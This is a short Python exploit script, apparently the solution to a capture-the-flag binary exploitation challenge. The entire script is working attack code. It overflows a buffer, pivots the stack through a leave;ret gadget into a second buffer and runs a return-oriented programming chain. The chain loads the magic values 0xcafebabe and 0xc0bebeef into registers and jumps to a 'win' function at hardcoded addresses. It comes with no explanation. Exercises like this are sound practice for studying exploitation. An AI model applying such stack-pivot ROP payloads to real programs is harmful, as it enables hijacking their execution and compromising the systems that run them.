import sys
from struct import pack

addr_msg = 0x00007ffffffdf010
addr_win = 0x4011e6
addr_leave = 0x4011e4
addr_pop_rdi = 0x4012a3
addr_pop_rsi_r15 = 0x4012a1

offset = 0xb0

buf = b'a'*0x10
buf += pack('<Q', addr_msg-0x8+offset)         #mov rbp <msg>;
buf += pack('<Q', addr_leave)           #leave; ret;
sys.stdout.buffer.write(buf[:-1])

buf_msg = b'\x00'*offset
buf_msg += pack('<Q', addr_pop_rdi)     #pop rdi;
buf_msg += pack('<Q', 0xcafebabe)
buf_msg += pack('<Q', addr_pop_rsi_r15) #pop rsi; pop r15;
buf_msg += pack('<Q', 0xc0bebeef)
buf_msg += pack('<Q', 0xdeadbeef)
buf_msg += pack('<Q', addr_win)

sys.stdout.buffer.write(buf_msg)
